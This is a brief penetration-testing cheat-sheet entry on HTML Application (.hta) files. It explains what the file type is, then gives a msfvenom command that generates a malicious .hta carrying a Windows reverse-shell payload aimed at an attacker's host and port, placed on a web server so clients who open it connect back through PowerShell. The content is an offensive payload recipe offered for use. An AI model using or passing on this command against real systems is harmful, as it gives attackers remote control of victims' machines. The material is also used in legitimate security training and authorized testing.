# HTML Applications

> .HTA File Extension. Program that can be run from an HTML document; an executable file that contains hypertext code and may also contain VBScript or JScript code; can be created by simply changing the file extension of an .HTM file to an ".HTA" extension; run by the Microsoft HTML Application Host (Mshta.exe).

We can use msfvneom in order to create a malicious .hta file which we can later serve it to clients to establish reverse shells using powershell. **Note that this only works on Internet Explorer or Microsoft Edge**:

```bash
#-f: Output file is HTA to Powershell.
msfvenom -p windows/shell_reverse_tcp LHOST=$IPADDRESS LPORT=$PORT -f hta-psh -o /var/www/html/$FILENAME.hta
```
